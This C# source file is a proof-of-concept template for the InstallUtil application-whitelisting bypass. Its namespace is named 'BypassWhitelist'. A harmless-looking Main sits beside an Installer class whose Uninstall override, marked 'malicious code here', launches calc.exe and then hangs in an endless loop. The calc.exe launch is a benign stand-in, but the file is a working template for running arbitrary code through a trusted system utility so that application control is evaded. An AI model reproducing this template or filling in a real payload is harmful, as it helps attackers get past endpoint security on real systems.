using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;

namespace BypassWhitelist
{
    class Program
    {
        static void Main()
        {
            Console.WriteLine("Normal program!");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // malicious code here
            System.Diagnostics.Process.Start("calc.exe");
            Console.WriteLine("calc.exe executed");
            while (true)
            {
                Thread.Sleep(1000);
            }
        }
    }
}
